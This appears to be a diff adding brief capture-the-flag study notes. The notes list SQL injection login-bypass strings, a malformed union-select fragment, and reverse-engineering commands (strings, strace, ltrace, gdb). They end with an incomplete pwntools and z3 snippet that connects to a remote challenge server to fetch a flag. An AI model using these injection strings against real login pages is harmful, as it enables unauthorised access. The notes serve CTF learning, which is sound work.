@@ -1,0 +1,39 @@
+user: ' or '1'='1'#
+pass: somethingds
+
+user: "*"
+pass: "*"
+
+## Union 
+user: ' or '1'='1'# select union select pass,1 from 
+
+## Reverse
+file baby
+strings baby # print valid string in file baby
+
+## 
+ftrace  # called func
+strace  
+ltrace  # lib
+
+gdb  <fname>
+
+mov 
+imul 
+
+## 
+from z3 import BitVec, Solver 
+from pwn import remote 
+
+x = BitVec('x', 32)
+y = BitVec('y', 32)
+
+r = remote('137.120.120.120', 3002)
+r.recvuntil('Password1: ')
+r.sendline(pass1)
+
+flag = r.recvall().decode()
+print(flag)
+
+
+
